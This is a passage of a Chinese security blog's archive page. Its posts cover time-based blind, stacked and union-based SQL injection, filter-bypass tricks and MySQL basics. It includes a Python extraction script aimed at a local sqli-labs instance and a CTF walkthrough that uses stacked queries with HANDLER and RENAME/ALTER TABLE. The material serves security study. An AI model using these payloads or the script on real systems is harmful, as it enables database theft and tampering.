<h4 id="2-延时盲注的攻击流程"><a href="#2-延时盲注的攻击流程" class="headerlink" title="2.延时盲注的攻击流程"></a>2.延时盲注的攻击流程</h4><h5 id="1-延时盲注的判断"><a href="#1-延时盲注的判断" class="headerlink" title="1.延时盲注的判断"></a>1.延时盲注的判断</h5><p>由于没有任何的回显内容，所以无法通过查看回显的方法判断是否存在注入，可以使用1 and sleep(5)或 者1’ and sleep(5)#进行测试，如果页面执行有延迟，说明存在漏洞，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">5</span>); #数字型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> sleep(<span class="number">5</span>)#<span class="string">&#x27;;#字符型</span></span><br></pre></td></tr></table></figure>

<h5 id="2-获取数据库长度-1"><a href="#2-获取数据库长度-1" class="headerlink" title="2.获取数据库长度"></a>2.获取数据库长度</h5><p>可以使用if语句进行判断，语法格式：if(expr1, expr2, expr3)：判断语句 如果第一个语句正确就执行第 二个语句，否则执行第三个语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> if(length(database()<span class="operator">=</span><span class="number">8</span>),sleep(<span class="number">3</span>),<span class="number">1</span>)#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果有延时说明数据库长度就是8</p>
<h5 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(substr(database(),1,1)=&#x27;</span>s<span class="string">&#x27;,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>或者利用ascii函数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<h5 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4.获取表名"></a>4.获取表名</h5><p>可以先获取表的数量</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if((select count(table_name) from information_schema.tables where table_schema=&quot;security&quot;)=4,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>然后获取每个表的长度</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<p>再然后获取表的名称</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1)%23</span></span><br></pre></td></tr></table></figure>

<h5 id="5-获取字段名"><a href="#5-获取字段名" class="headerlink" title="5.获取字段名"></a>5.获取字段名</h5><h5 id="6-获取字段内容"><a href="#6-获取字段内容" class="headerlink" title="6.获取字段内容"></a>6.获取字段内容</h5><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1/sqli/Less-9/?id=1&#x27; and &quot;</span></span><br><span class="line"><span class="comment"># select = &#x27;select database()&#x27;   #数据库  security</span></span><br><span class="line"><span class="comment"># select = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;   #表名  emails,referers,uagents,users</span></span><br><span class="line"><span class="comment"># select = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27;&quot;            #字段名</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(email_id) from emails&quot;</span>   <span class="comment">#字段内容</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        payload = <span class="string">f&quot;if((ascii(substr((<span class="subst">&#123;select&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>),sleep(3),1)--+&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">125</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%B2%E6%B3%A8/" rel="tag">盲注</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-堆叠注入"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"
    >堆叠注入</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2023-02-02T08:53:04.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL可以执行多条语句，多条语句之前用;做分隔。 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法 执行其他恶意语句，如RENAME、DROP等，堆叠注入可以用于执行任何SQL语句。 </span><br><span class="line">并不是所有情况下都可以使用堆叠注入</span><br><span class="line">需要满足条件$mysqli-&gt;multi_query($sql);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返 回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键 字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名</span><br></pre></td></tr></table></figure>

<h3 id="当select被过滤了用handler来绕过"><a href="#当select被过滤了用handler来绕过" class="headerlink" title="当select被过滤了用handler来绕过"></a>当select被过滤了用handler来绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一 行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是</span><br><span class="line">mysql专用的语句，并没有包含到SQL标准中。</span><br><span class="line">条件：堆叠注入</span><br><span class="line">handler users open as hd; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler hd read first; #读取指定表/句柄的首行数据 </span><br><span class="line">handler hd read next; #读取指定表/句柄的下一行数据</span><br><span class="line">handler hd close; #关闭句柄</span><br></pre></td></tr></table></figure>



<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[强网杯 2019]随便注</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190616986.png" alt="1662190616986"></p>
<p>输入  1’</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190675022.png" alt="1662190675022"></p>
<p>报错说明存在sql注入漏洞</p>
<p>输入   1’ order by 3#时</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190776274.png" alt="1662190776274"></p>
<p>说明select语句里有两个字段</p>
<p>然后尝试用联合注入获取数据库名</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662190923197.png" alt="1662190923197"></p>
<p>发现select被过滤了然后用堆叠注入的方法获得表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191211421.png" alt="1662191211421"></p>
<p>得到两个表 然后分别查询两个表中的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191442844.png" alt="1662191442844"></p>
<p>这里发现有个 flag</p>
<p>第一种方法：</p>
<p>所以只需   select flag from <code>1919810931114514</code>;#   但是select被过滤了所以要用handler1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first#</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662191646739.png" alt="1662191646739"></p>
<p>第二种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from `words`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662206518828.png" alt="1662206518828"></p>
<p>发现了   id    data   这两个字段</p>
<p>可以</p>
<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，把flag改为id</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words2`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#</span><br></pre></td></tr></table></figure>

<p>然后</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1662208984049.png" alt="1662208984049"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" rel="tag">堆叠注入</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-union联合注入"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"
    >union联合注入</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2023-02-02T08:51:22.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1.判断是否存在漏洞"></a>1.判断是否存在漏洞</h3><p>用单引号或者双引号判断是否报错。若报错则存在sql注入漏洞</p>
<h3 id="2-判断是字符型的还是数字型漏洞"><a href="#2-判断是字符型的还是数字型漏洞" class="headerlink" title="2.判断是字符型的还是数字型漏洞"></a>2.判断是字符型的还是数字型漏洞</h3><p>输入    </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2#</span></span><br></pre></td></tr></table></figure>

<p>如果与原来只输入  1   的结果相同则是数字</p>
<h3 id="3-判断select几列"><a href="#3-判断select几列" class="headerlink" title="3.判断select几列"></a>3.判断select几列</h3><p>用  order  by</p>
<p>如果order by  被过滤了可以用group by</p>
<h3 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h3><p>假设这里select的是3列  然后需要自己在判断一下哪几位是回显位  然后用联合注入查询 数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,database()#</span></span><br></pre></td></tr></table></figure>

<h3 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表， 表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际 上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</span><br><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果 取之此表。</span><br><span class="line">TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个</span><br><span class="line">schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的 结果取之此表。</span><br><span class="line">COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是</span><br><span class="line">show columns from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;&#x27; and table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<h3 id="7-查询字段中的内容"><a href="#7-查询字段中的内容" class="headerlink" title="7.查询字段中的内容"></a>7.查询字段中的内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(, , ) from biaoming#</span></span><br></pre></td></tr></table></figure>



<p>group_concat()  函数是让多行数据在一行显示   如果被过滤  可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 0,1;</span><br></pre></td></tr></table></figure>



 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/union%E8%81%94%E5%90%88/" rel="tag">union联合</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-绕过技巧"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"
    >绕过技巧</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" class="article-date">
  <time datetime="2023-02-02T08:49:27.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="1-空格被过滤"><a href="#1-空格被过滤" class="headerlink" title="1.空格被过滤"></a>1.空格被过滤</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">括号绕过</span><br><span class="line"><span class="keyword">select</span>(id)<span class="keyword">from</span>(admin)<span class="keyword">where</span>(id<span class="operator">=</span><span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注释绕过</span><br><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>admin;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反引号绕过（数据库默认识别关键字，不用加引号）</span><br><span class="line"><span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>`admin`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">其它空白字符绕过</span><br><span class="line">TAB %09   TAB键</span><br><span class="line">LF  %0A   新行</span><br><span class="line">FF  %0C   新页</span><br><span class="line">CR  %0D   回车</span><br></pre></td></tr></table></figure>



<h1 id="2-逗号被过滤"><a href="#2-逗号被过滤" class="headerlink" title="2.逗号被过滤"></a>2.逗号被过滤</h1><p>可以用  from for 代替</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> substr(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin limit <span class="number">1</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h1 id="3-过滤-掉比较运算符"><a href="#3-过滤-掉比较运算符" class="headerlink" title="3.过滤 掉比较运算符"></a>3.过滤 掉比较运算符</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">greaest(ascii(substr(<span class="string">&#x27;admin&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>) <span class="operator">=</span> <span class="number">97</span></span><br><span class="line">least(<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line">strcmp(str1,str2)  </span><br><span class="line">substr(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">substr(<span class="string">&#x27;admin&#x27;</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>) <span class="keyword">between</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;b&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="4-过滤and"><a href="#4-过滤and" class="headerlink" title="4.过滤and"></a>4.过滤and</h1><p>用&amp;&amp;但是&amp;一般会被认为参数连接符   所以需要使用URL编码</p>
<p>%26%26</p>
<p>还可以用or来替代</p>
<h1 id="5-过滤等号"><a href="#5-过滤等号" class="headerlink" title="5.过滤等号"></a>5.过滤等号</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用  <span class="keyword">in</span> (<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span>,rlike</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">between</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp</span><br></pre></td></tr></table></figure>



<h1 id="6-过滤注释符"><a href="#6-过滤注释符" class="headerlink" title="6.过滤注释符"></a>6.过滤注释符</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--空格</span><br><span class="line">--+</span><br><span class="line">/**/</span><br><span class="line"><span class="meta prompt_">#</span></span><br></pre></td></tr></table></figure>

<h1 id="7-内联注释绕过"><a href="#7-内联注释绕过" class="headerlink" title="7.内联注释绕过"></a>7.内联注释绕过</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span>  <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>

<h1 id="8-过滤单引号"><a href="#8-过滤单引号" class="headerlink" title="8.过滤单引号"></a>8.过滤单引号</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制绕过</span><br><span class="line"><span class="type">char</span>()函数  web   <span class="comment">---&gt;&gt;   char(119)+char(101)+char(98)</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-数据库基本知识"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"
    >数据库基本知识</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" class="article-date">
  <time datetime="2023-02-02T08:48:02.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01、显示数据库 show databases；</span><br><span class="line">02、打开数据库 use db_name;</span><br><span class="line">03、显示数据表 show tables;</span><br><span class="line">04、显示表结构 describe table_name;</span><br><span class="line">05、显示表中各字段信息，即表结构 show columns from table_name;</span><br><span class="line">06、显示表创建过程 show create table 表名;</span><br><span class="line">07、列出当前mysql的相关状态信息 status;</span><br><span class="line">08、删除数据库 drop database 数据库名;</span><br><span class="line">09、清空数据表 delete from table_name; truncate table table_name;</span><br><span class="line">10、删除数据表 drop table table_name</span><br><span class="line">11、数据库连接 mysql –uroot -proot</span><br><span class="line">12、数据库退出 exit</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-变量覆盖"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"
    >变量覆盖</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" class="article-date">
  <time datetime="2023-02-02T07:18:07.000Z" itemprop="datePublished">2023-02-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">变量覆盖</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="extract函数"><a href="#extract函数" class="headerlink" title="extract函数"></a>extract函数</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><img src="/2023/02/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/1662030722719.png" alt="1662030722719"></p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>题目源码</p>
